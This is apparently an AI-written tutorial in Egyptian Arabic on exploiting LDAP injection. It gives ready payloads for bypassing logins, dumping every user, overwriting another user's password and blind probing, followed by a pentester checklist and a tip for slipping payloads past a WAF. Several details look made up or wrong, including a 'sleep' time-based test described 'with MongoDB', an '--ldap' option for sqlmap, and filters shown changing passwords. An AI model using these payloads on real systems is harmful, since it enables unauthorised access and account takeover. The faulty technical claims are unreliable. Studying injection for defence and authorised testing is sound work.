
### **1. تجاوز المصادقة (Authentication Bypass)**
#### **إيه هو؟**
LDAP Injection بيحصل لما تطبيق بيستخدم LDAP (Lightweight Directory Access Protocol) للمصادقة وميعملش فلترة كويسة للمدخلات. تقدر تحقن كود يخليك تتخطى اللوجين من غير باسوورد صحيح.

#### **ازاي بيحصل؟**
LDAP بيستخدم استعلامات زي `(username=admin)(password=123)`، لو حطيت علامات خاصة زي `*` أو `)`، تقدر تغير منطق الاستعلام.

#### **مثال عملي:**
- الاستعلام الأصلي:
  ```
  (uid=admin)(userPassword=123)
  ```
- في حقل اليوزر نيم، جرب:
  ```
  admin)(&
  ```
  وفي الباسوورد أي حاجة (زي `test`). الاستعلام هيبقى:
  ```
  (uid=admin)(&)(userPassword=test)
  ```
  الـ `)(&` بيفصل الشرط ويخليه دايماً صح (True)، فتدخل من غير باسوورد.

- **اختبار حقيقي:**
  لو في فورم لوجين، حط: 
  ```
  username: admin)(&
  password: whatever
  ```
قصده هنا انك لو كتبت في اسم المستخدم كده وضغطت login هتخش علي الصفحه منغير م تكتب الباسورد بس لازم يكون اسم المستخدم صح

  لو دخلت، يبقى نجح.

#### **خلاصة طريفة:**
تخيل إنك بتقول للبواب "أنا أحمد وبكمل الكلام بعدين"، لو فتحلك الباب من غير ما يكمل السؤال، يبقى هو اللي سابك تتسحب!

---

### **2.  Valid LDAP Attributes
#### **إيه هو؟**
لو التطبيق بيستخدم LDAP لجلب بيانات (زي الاسم أو الإيميل)، تقدر تحقن استعلام يجيبلك بيانات كل المستخدمين بدل يوزر واحد.

#### **ازاي بيحصل؟**
بتستخدم الـ Wildcard `*` عشان تجيب كل النتايج من الديركتوري.

#### **مثال عملي:**
- الاستعلام الأصلي:
  ```
  (uid=admin)
  ```
- في حقل البحث أو اليوزر نيم:
  ```
  *)(uid=*
  ```
  الاستعلام هيبقى:
  ```
  (uid=*)(uid=*)
  ```
  معناه: "جيب كل المستخدمين اللي عندهم uid"، وكده هيرجعلك كل اليوزرز.

- **اختبار حقيقي:**
  لو في صفحة بحث:
  ```
  search: *)(uid=*
  ```
  لو ظهرت قايمة بكل المستخدمين (زي أسماء وإيميلات)، يبقى نجح.

#### **خلاصة طريفة:**
تخيل إنك بتقول لصاحب المخزن "هاتلي حاجة لأحمد، أو لأي حد موجود"، لو جابلك كل الحاجات، يبقى المخزن كله بقى بتاعك!

---

### **3. تعديل بيانات الديركتوري**
#### **إيه هو؟**
لو التطبيق بيسمح بكتابة بيانات في LDAP وفيه ثغرة، تقدر تحقن استعلام يغير بيانات زي الباسوورد أو الصلاحيات.

#### **ازاي بيحصل؟**
بتستخدم حقن يضيف أو يعدل خصائص (Attributes) في الديركتوري.

#### **مثال عملي:**
- الاستعلام الأصلي:
  ```
  (uid=admin)(mail=newemail@example.com)
  ```
- في حقل التعديل:
  ```
  admin)(userPassword=newpass
  ```
  الاستعلام هيبقى:
  ```
  (uid=admin)(userPassword=newpass)(mail=newemail@example.com)
  ```
  كده غيرت الباسوورد لـ `newpass`.

- **اختبار حقيقي:**
  لو في حقل تعديل بروفايل:
  ```
  username: admin)(userPassword=hacked
  ```
  لو اتغير الباسوورد، جرب تدخل بيه.

#### **خلاصة طريفة:**
تخيل إنك بتقول للموظف "غيرلي إيميلي، وكمان حطلي كلمة سر جديدة"، لو نفذ من غير ما يسأل، يبقى بقيت إنت المسؤول!

---

### **4. استغلال Blind LDAP Injection**
#### **إيه هو؟**
لو التطبيق مش بيرجع نتايج مباشرة، تقدر تستخدم تقنيات Blind (زي Boolean أو Time-Based) عشان تتأكد من الثغرة وتستخرج بيانات.

#### **ازاي بيحصل؟**
بتحقن شروط بترجع True/False أو تتأخر في الرد لو الشرط صح.

#### **مثال عملي:**
- **Boolean-Based:**
  الاستعلام الأصلي:
  ```
  (uid=admin)
  ```
  جرب:
  ```
  admin)(uid=admin
  ```
  لو دخلت، يبقى True. جرب:
  ```
  admin)(uid=wrong
  ```
  لو رفض، يبقى False.

- **Time-Based:**
  لو MongoDB مع LDAP:
  ```
  admin)(sleep=5
  ```
  لو الصفحة استنيت 5 ثواني، يبقى في ثغرة.

#### **خلاصة طريفة:**
تخيل إنك بتسأل البواب "لو أنا أحمد افتح الباب، لو مش أحمد استنى 5 ثواني"، لو استنى يبقى فتحتلك المجال تلعب!

---

### **خطوات عملية للاستغلال كـ Pentester**
1. **تجاوز المصادقة:**
   - في فورم لوجين، جرب:
     ```
     username: admin)(&
     password: test
     ```
     لو دخلت، يبقى نجح.

2. **استخراج البيانات:**
   - في حقل بحث:
     ```
     *)(uid=*
     ```
     لو رجع كل المستخدمين، دوّنهم.

3. **تعديل البيانات:**
   - في حقل تعديل:
     ```
     admin)(userPassword=newpass
     ```
     جرب اللوجين بالباسوورد الجديد.

4. **اختبار Blind:**
   - Boolean: جرب:
     ```
     admin)(uid=admin
     ```
     ثم:
     ```
     admin)(uid=wrong
     ```
   - Time-Based:
     ```
     admin)(sleep=5
     ```
     لو تأخرت، يبقى شغال.

5. **استخدام أدوات:**
   - جرب Burp Suite:
     اعترض الطلب وحط:
     ```
     username=admin)(&
     ```
   - أو sqlmap لو مدموج مع LDAP:
     ```
     sqlmap -u "http://example.com/login.php" --data="username=admin&password=test" --ldap
     ```

#### **نصيحة:**
- دوّن ردود السيرفر (زي أخطاء أو تأخير) عشان تفهم نوع الثغرة.
- لو في WAF، جرب تشفير الـ Payload زي `%29%26`.

---

ها، عايز أشرح حاجة زيادة زي استخراج بيانات أكتر أو أعمق في Blind؟